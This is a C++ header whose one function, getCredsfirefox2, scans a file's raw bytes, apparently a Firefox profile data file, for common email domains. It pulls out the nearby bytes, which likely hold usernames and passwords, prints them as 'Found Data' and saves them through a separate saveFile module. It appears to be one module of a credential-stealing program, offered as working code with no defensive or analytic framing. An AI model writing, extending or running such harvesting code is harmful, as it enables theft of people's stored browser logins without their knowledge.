#pragma once
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include "../core/saveFile.h"

int getCredsfirefox2(std::string filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    std::vector<std::string> emailDomains = {
        "@gmail.com", "@yahoo.com", // ... include any relevant domain name here
    };

    for (const auto& domain : emailDomains) {
        file.clear();  // Clear any error flags
        file.seekg(0, std::ios::beg);  // Go back to the start of the file

        std::string buffer;
        char c;

        while (file.get(c)) {
            buffer.push_back(c);

            size_t foundPos = buffer.find(domain);
            if (foundPos != std::string::npos) {
                // Read additional 50 characters after the domain
                std::string postDomain;
                for (int i = 0; i < 50; ++i) {
                    if (file.get(c)) {
                        postDomain.push_back(c);
                    }
                    else {
                        break; // End of file reached
                    }
                }

                size_t startPos = (foundPos < 30) ? 0 : foundPos - 30;
                size_t endPos = foundPos + domain.size();

                // Extract and print the relevant part of the buffer and post domain data
                std::string extractedData = buffer.substr(startPos, endPos - startPos) + postDomain;
                std::cout << "Found Data: " << extractedData << std::endl;

                // Save into file
                saveFile(extractedData);

                // Clear buffer and continue
                buffer.clear();
            }

            // Keep buffer to a manageable size
            if (buffer.size() > 80) {
                buffer.erase(0, 1);
            }
        }
    }

    file.close();
    return 0;
}
